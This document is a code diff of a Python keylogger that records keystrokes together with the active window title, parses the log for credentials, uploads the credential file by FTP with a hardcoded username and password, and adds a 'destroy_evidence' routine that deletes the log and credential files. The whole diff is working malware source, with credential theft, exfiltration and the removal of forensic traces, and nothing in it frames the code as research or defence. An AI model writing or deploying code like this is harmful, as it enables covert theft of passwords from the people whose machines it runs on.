@@ -1,6 +1,6 @@
 from pynput.keyboard import Key, Listener
 from win32gui import GetWindowText, GetForegroundWindow
-from os import remove, fdopen
+from os import remove
 import logging
 import ftplib
 import Analyzer
@@ -15,8 +15,6 @@ class Logger:
         logging.basicConfig(filename=(log_file), level=logging.DEBUG,
                             format=( '%(message)s : '))
         self.analyzer = Analyzer.Analyzer(log_file, self.cred_file)
-        self.session = ftplib.FTP('127.0.0.1', 'Admin', 'Twinbros1;')
-        self.configCredFile()
     
     def on_press(self, Key):
         log_str = str(Key) + ' | ' + GetWindowText(GetForegroundWindow())
@@ -26,21 +24,29 @@ class Logger:
             if(not self.analyzer.will_not_parse):
                 done_analyzing = self.analyzer.parse_log_file()
             if done_analyzing:
-                # send file of credentials thru ftp
-                file_to_send = fdopen(self.cred_file, 'rb')
-                self.session.storbinary('STOR example.txt', file_to_send)
-                self.session.quit()
-                file_to_send.close()
-                remove(cred_file)
                 return False
         else:
             logging.info(log_str)
     
     def log_keys(self):
-        return
         with Listener(on_press=self.on_press) as listener:
             listener.join()
-
+    
+    def send_file(self):
+        # send file of credentials thru ftp
+        session = ftplib.FTP('127.0.0.1', 'Admin', 'Twinbros1;')
+        file_to_send = open(self.cred_file, 'rb')
+        session.storbinary('STOR ' + 'creds.txt', file_to_send)
+        file_to_send.close()
+        session.quit()
+    
+    def destroy_evidence(self):
+        logging.shutdown()
+        remove(log_file)
+        remove(cred_file)
+        
 if __name__ == '__main__':
     logger = Logger(log_file, cred_file)
     logger.log_keys()
+    logger.send_file()
+    logger.destroy_evidence()
